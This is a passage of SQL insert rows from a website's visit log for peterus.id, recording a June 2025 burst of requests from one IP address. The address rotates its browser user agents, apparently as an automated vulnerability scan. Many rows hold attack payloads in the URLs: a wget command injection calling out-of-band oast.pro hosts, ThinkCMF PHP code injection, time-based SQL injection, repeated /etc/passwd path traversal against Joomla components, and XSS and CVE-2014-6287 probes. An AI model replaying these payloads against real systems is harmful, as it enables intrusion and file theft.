(601, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 20:05:29', '2025-06-27 20:05:29'),
(602, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 20:05:30', '2025-06-27 20:05:30'),
(603, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 20:05:52', '2025-06-27 20:05:52'),
(604, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0', 'https://www.peterus.id/index.php?page=home', '2025-06-27 20:06:21', '2025-06-27 20:06:21'),
(605, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'https://peterus.id/index.php?plot=%3Bwget%20http%3A%2F%2Fd1f0llipp1o26gc6gergetc6g3qunpkqz.oast.pro', '2025-06-27 20:13:01', '2025-06-27 20:13:01'),
(606, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?plot=%3Bwget%20http%3A%2F%2Fd1f0llipp1o26gc6gergt75nicrug3cko.oast.pro', '2025-06-27 20:14:51', '2025-06-27 20:14:51'),
(607, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1', 'https://peterus.id', '2025-06-27 20:19:00', '2025-06-27 20:19:00'),
(608, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 20:21:23', '2025-06-27 20:21:23'),
(609, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686; rv:120.0) Gecko/20100101 Firefox/120.0', 'https://peterus.id', '2025-06-27 20:22:34', '2025-06-27 20:22:34'),
(610, '156.246.17.42', 'Mozilla/5.0 (SS; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0', 'https://peterus.id/?XDEBUG_SESSION_START=2z4c7zSixNOihmf6VgS8VvZ7fnS', '2025-06-27 20:22:49', '2025-06-27 20:22:49'),
(611, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.3 Safari/605.1.15', 'https://peterus.id/index.php', '2025-06-27 20:23:59', '2025-06-27 20:23:59'),
(612, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0', 'https://peterus.id/?BazaR=&vue=consulter', '2025-06-27 20:24:21', '2025-06-27 20:24:21'),
(613, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0', 'https://www.peterus.id', '2025-06-27 20:25:00', '2025-06-27 20:25:00'),
(614, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15', 'https://www.peterus.id/?XDEBUG_SESSION_START=2z4c7zSixNOihmf6VgS8VvZ7fnS', '2025-06-27 20:25:13', '2025-06-27 20:25:13'),
(615, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15', 'https://www.peterus.id/index.php', '2025-06-27 20:26:35', '2025-06-27 20:26:35'),
(616, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux i686; rv:127.0) Gecko/20100101 Firefox/127.0', 'https://peterus.id', '2025-06-27 20:26:58', '2025-06-27 20:26:58'),
(617, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Safari/117.0 Safari/537.36', 'https://peterus.id', '2025-06-27 20:27:33', '2025-06-27 20:27:33'),
(618, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1', 'https://www.peterus.id/?BazaR=&vue=consulter', '2025-06-27 20:28:52', '2025-06-27 20:28:52'),
(619, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Safari/129.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 20:29:00', '2025-06-27 20:29:00'),
(620, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 20:29:14', '2025-06-27 20:29:14'),
(621, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.3 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 20:31:08', '2025-06-27 20:31:08'),
(622, '156.246.17.42', 'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 20:33:59', '2025-06-27 20:33:59'),
(623, '156.246.17.42', 'Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 20:35:54', '2025-06-27 20:35:54'),
(624, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux i686; rv:120.0) Gecko/20100101 Firefox/120.0', 'https://peterus.id/index.php?a=fetch&content=%3C%3Fphp%20file_put_contents%28%222z4c80UEkgmLTWTjpIJ2AClDLQI.php%22%2C%22%3C%3Fphp%20echo%20md5%28%22thinkcmf-rce%22%29%3Bunlink%28__FILE__%29%3B%22%29%3B', '2025-06-27 20:36:59', '2025-06-27 20:36:59'),
(625, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 20:38:16', '2025-06-27 20:38:16'),
(626, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 20:38:56', '2025-06-27 20:38:56'),
(627, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.10 Mobile/15E148 Safari/604.1', 'https://peterus.id', '2025-06-27 20:39:42', '2025-06-27 20:39:42'),
(628, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?a=fetch&content=%3C%3Fphp%20file_put_contents%28%222z4c80UEkgmLTWTjpIJ2AClDLQI.php%22%2C%22%3C%3Fphp%20echo%20md5%28%22thinkcmf-rce%22%29%3Bunlink%28__FILE__%29%3B%22%29%3B', '2025-06-27 20:40:34', '2025-06-27 20:40:34'),
(629, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 20:41:37', '2025-06-27 20:41:37'),
(630, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686; rv:127.0) Gecko/20100101 Firefox/127.0', 'https://www.peterus.id', '2025-06-27 20:41:56', '2025-06-27 20:41:56'),
(631, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15', 'https://peterus.id', '2025-06-27 20:42:22', '2025-06-27 20:42:22'),
(632, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686; rv:124.0) Gecko/20100101 Firefox/124.0', 'https://www.peterus.id', '2025-06-27 20:46:19', '2025-06-27 20:46:19'),
(633, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0', 'https://peterus.id/?league_id=1%27%20AND%20%28SELECT%201909%20FROM%20%28SELECT%28SLEEP%286%29%29%29ZiBf%29--%20qODp&match_day=1&season=1&team_id=1', '2025-06-27 20:54:53', '2025-06-27 20:54:53'),
(634, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0', 'https://www.peterus.id/?league_id=1%27%20AND%20%28SELECT%201909%20FROM%20%28SELECT%28SLEEP%286%29%29%29ZiBf%29--%20qODp&match_day=1&season=1&team_id=1', '2025-06-27 20:57:46', '2025-06-27 20:57:46'),
(635, '156.246.17.42', 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4', 'https://peterus.id', '2025-06-27 20:59:46', '2025-06-27 20:59:46'),
(636, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0', 'https://peterus.id', '2025-06-27 21:02:23', '2025-06-27 21:02:23'),
(637, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0', 'https://peterus.id', '2025-06-27 21:02:24', '2025-06-27 21:02:24'),
(638, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 21:03:32', '2025-06-27 21:03:32'),
(639, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Safari/120.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 21:07:11', '2025-06-27 21:07:11'),
(640, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0', 'https://www.peterus.id', '2025-06-27 21:07:11', '2025-06-27 21:07:11'),
(641, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 21:08:55', '2025-06-27 21:08:55'),
(642, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 21:10:40', '2025-06-27 21:10:40'),
(643, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux i686; rv:129.0) Gecko/20100101 Firefox/129.0', 'https://peterus.id', '2025-06-27 21:12:24', '2025-06-27 21:12:24'),
(644, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 21:13:04', '2025-06-27 21:13:04'),
(645, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 21:13:46', '2025-06-27 21:13:46'),
(646, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Edge/106.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 21:13:59', '2025-06-27 21:13:59'),
(647, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0', 'https://peterus.id', '2025-06-27 21:14:13', '2025-06-27 21:14:13'),
(648, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0', 'https://www.peterus.id', '2025-06-27 21:16:08', '2025-06-27 21:16:08'),
(649, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux i686; rv:124.0) Gecko/20100101 Firefox/124.0', 'https://peterus.id/index.php?a=index&content=%3C%3Fphp%20echo%20md5%28%27ThinkCMF%27%29%3B&g=g&m=Door', '2025-06-27 21:31:27', '2025-06-27 21:31:27'),
(650, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15', 'https://peterus.id/index.php?page_slug=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00', '2025-06-27 21:32:26', '2025-06-27 21:32:26'),
(651, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0', 'https://www.peterus.id/index.php?a=index&content=%3C%3Fphp%20echo%20md5%28%27ThinkCMF%27%29%3B&g=g&m=Door', '2025-06-27 21:33:14', '2025-06-27 21:33:14'),
(652, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15', 'https://www.peterus.id/index.php?page_slug=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00', '2025-06-27 21:34:19', '2025-06-27 21:34:19'),
(653, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15', 'https://peterus.id/?url=%3Cimg%2Fsrc%3D%22http%3A%2F%2Fd1f0llipp1o26gc6gerg69tpba5ge7pj5.oast.pro%22%3E', '2025-06-27 21:36:30', '2025-06-27 21:36:30'),
(654, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15', 'https://peterus.id', '2025-06-27 21:37:04', '2025-06-27 21:37:04'),
(655, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0', 'https://peterus.id/index.php?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', '2025-06-27 21:37:50', '2025-06-27 21:37:50'),
(656, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_perchagallery', '2025-06-27 21:38:02', '2025-06-27 21:38:02'),
(657, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0', 'https://www.peterus.id/?url=%3Cimg%2Fsrc%3D%22http%3A%2F%2Fd1f0llipp1o26gc6gergpps716ub1ktg4.oast.pro%22%3E', '2025-06-27 21:38:19', '2025-06-27 21:38:19'),
(658, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0', 'https://www.peterus.id', '2025-06-27 21:38:51', '2025-06-27 21:38:51'),
(659, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686; rv:127.0) Gecko/20100101 Firefox/127.0', 'https://peterus.id', '2025-06-27 21:39:30', '2025-06-27 21:39:30'),
(660, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686; rv:131.0) Gecko/20100101 Firefox/131.0', 'https://www.peterus.id/index.php?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', '2025-06-27 21:39:40', '2025-06-27 21:39:40'),
(661, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_perchagallery', '2025-06-27 21:39:49', '2025-06-27 21:39:49'),
(662, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'https://peterus.id/index.php?option=com_jejob&view=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00', '2025-06-27 21:41:49', '2025-06-27 21:41:49'),
(663, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 21:43:08', '2025-06-27 21:43:08'),
(664, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', 'https://peterus.id/?page=step_1', '2025-06-27 21:43:12', '2025-06-27 21:43:12'),
(665, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?option=com_jejob&view=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00', '2025-06-27 21:43:34', '2025-06-27 21:43:34'),
(666, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_tweetla', '2025-06-27 21:44:26', '2025-06-27 21:44:26'),
(667, '156.246.17.42', 'Mozilla/5.0 (SS; Linux i686; rv:125.0) Gecko/20100101 Firefox/125.0', 'https://peterus.id', '2025-06-27 21:45:06', '2025-06-27 21:45:06'),
(668, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Safari/537.36', 'https://peterus.id', '2025-06-27 21:45:48', '2025-06-27 21:45:48'),
(669, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_tweetla', '2025-06-27 21:46:12', '2025-06-27 21:46:12'),
(670, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 21:46:15', '2025-06-27 21:46:15'),
(671, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 21:46:32', '2025-06-27 21:46:32'),
(672, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'https://www.peterus.id/?page=step_1', '2025-06-27 21:46:36', '2025-06-27 21:46:36'),
(673, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux i686; rv:125.0) Gecko/20100101 Firefox/125.0', 'https://www.peterus.id', '2025-06-27 21:46:52', '2025-06-27 21:46:52'),
(674, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0', 'https://www.peterus.id', '2025-06-27 21:49:03', '2025-06-27 21:49:03'),
(675, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://peterus.id/?search=%3D%00%7B.cookie%7Cq5pE0o%7Cvalue%3DCVE-2014-6287.%7D', '2025-06-27 21:49:30', '2025-06-27 21:49:30'),
(676, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.6) AppleWebKit/620.30 (KHTML, like Gecko) Version/17.0 Safari/620.30', 'https://peterus.id', '2025-06-27 21:50:07', '2025-06-27 21:50:07'),
(677, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15', 'https://www.peterus.id/?search=%3D%00%7B.cookie%7Cq5pE0o%7Cvalue%3DCVE-2014-6287.%7D', '2025-06-27 21:51:07', '2025-06-27 21:51:07'),
(678, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686; rv:120.0) Gecko/20100101 Firefox/120.0', 'https://www.peterus.id', '2025-06-27 21:53:28', '2025-06-27 21:53:28'),
(679, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'https://peterus.id/index.php?option=com_jequoteform&view=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00', '2025-06-27 21:54:52', '2025-06-27 21:54:52'),
(680, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_orgchart', '2025-06-27 21:56:31', '2025-06-27 21:56:31'),
(681, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?option=com_jequoteform&view=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00', '2025-06-27 21:56:43', '2025-06-27 21:56:43'),
(682, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15', 'https://peterus.id/index.php?option=com_redtwitter&view=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00', '2025-06-27 21:57:12', '2025-06-27 21:57:12'),
(683, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_orgchart', '2025-06-27 21:58:22', '2025-06-27 21:58:22'),
(684, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux i686; rv:133.0) Gecko/20100101 Firefox/133.0', 'https://www.peterus.id/index.php?option=com_redtwitter&view=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00', '2025-06-27 21:58:58', '2025-06-27 21:58:58'),
(685, '156.246.17.42', 'Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', 'https://peterus.id/index.php?auth=582f27d140497a9d8f048ca085b111df&c=api&m=data2&param=action%3Dsql%20sql%3D%27select%20md5%28999999999%29%27', '2025-06-27 21:59:26', '2025-06-27 21:59:26'),
(686, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'https://peterus.id/index.php?s=example', '2025-06-27 22:00:07', '2025-06-27 22:00:07'),
(687, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?auth=582f27d140497a9d8f048ca085b111df&c=api&m=data2&param=action%3Dsql%20sql%3D%27select%20md5%28999999999%29%27', '2025-06-27 22:01:12', '2025-06-27 22:01:12'),
(688, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_graphics', '2025-06-27 22:01:38', '2025-06-27 22:01:38'),
(689, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?s=example', '2025-06-27 22:01:52', '2025-06-27 22:01:52'),
(690, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_graphics', '2025-06-27 22:03:25', '2025-06-27 22:03:25'),
(691, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 22:05:57', '2025-06-27 22:05:57'),
(692, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 22:10:56', '2025-06-27 22:10:56'),
(693, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux i686; rv:120.0) Gecko/20100101 Firefox/120.0', 'https://peterus.id/?c=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00', '2025-06-27 22:15:10', '2025-06-27 22:15:10'),
(694, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', 'https://peterus.id/?%7Balert%28document.domain%29%7D=', '2025-06-27 22:17:05', '2025-06-27 22:17:05'),
(695, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_properties', '2025-06-27 22:17:47', '2025-06-27 22:17:47'),
(696, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/537.86.4', 'https://www.peterus.id/?c=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00', '2025-06-27 22:18:44', '2025-06-27 22:18:44'),
(697, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15', 'https://www.peterus.id/?%7Balert%28document.domain%29%7D=', '2025-06-27 22:18:49', '2025-06-27 22:18:49'),
(698, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_multimap', '2025-06-27 22:19:12', '2025-06-27 22:19:12'),
(699, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_properties', '2025-06-27 22:19:32', '2025-06-27 22:19:32'),
(700, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15', 'https://peterus.id/index.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', '2025-06-27 22:19:52', '2025-06-27 22:19:52'),
(701, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_multimap', '2025-06-27 22:21:04', '2025-06-27 22:21:04'),
(702, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686; rv:120.0) Gecko/20100101 Firefox/120.0', 'https://www.peterus.id/index.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', '2025-06-27 22:21:42', '2025-06-27 22:21:42'),
